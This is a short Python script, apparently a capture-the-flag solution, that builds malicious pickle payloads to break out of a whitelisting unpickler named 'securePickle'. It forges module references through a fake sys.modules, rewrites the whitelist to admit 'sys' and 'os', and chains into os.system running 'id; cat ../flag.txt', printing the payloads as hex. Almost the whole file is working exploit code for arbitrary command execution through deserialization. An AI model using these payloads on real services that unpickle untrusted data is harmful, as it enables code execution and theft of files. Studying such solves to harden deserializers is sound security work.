import pickle
import sys


class FakeMod(type(sys)):
    modules = {}

    def __init__(self, name):
        self.d = {}
        super().__init__(name)

    def __getattribute__(self, name):
        d = self()
        return d[name]

    def __call__(self):
        return object.__getattribute__(self, "d")


def attr(s):
    mod, name = s.split(".")
    if mod not in FakeMod.modules:
        FakeMod.modules[mod] = FakeMod(mod)
    d = FakeMod.modules[mod]()
    if name not in d:
        def f(): pass
        f.__module__ = mod
        f.__qualname__ = name
        f.__name__ = name
        d[name] = f
    return d[name]


def dumps(obj):
    # use python version of dumps
    # which is easier to hack
    pickle.dumps = pickle._dumps
    orig = sys.modules
    sys.modules = FakeMod.modules
    s = pickle.dumps(obj)
    sys.modules = orig
    return s


def craft(func, *args, dict=None, list=None, items=None):
    class X:
        def __reduce__(self):
            tup = func, tuple(args)
            if dict or list or items:
                tup += dict, list, items
            return tup
    return X()


a = attr("empty.__dict__")
print(dumps(a).hex())
c1 = craft(
    attr("empty.__setattr__"),
    "modules", {"sys": attr("sys.modules")}
)
c2 = craft(attr("sys.__getitem__"), "securePickle",
           dict={"whitelist": ["sys", "os"]})
c3 = craft(attr("os.system"), "id; cat ../flag.txt")
obj = craft(attr("sys.displayhook"), (c1, c2, c3))

s = dumps(obj)
print(dumps(s).hex())
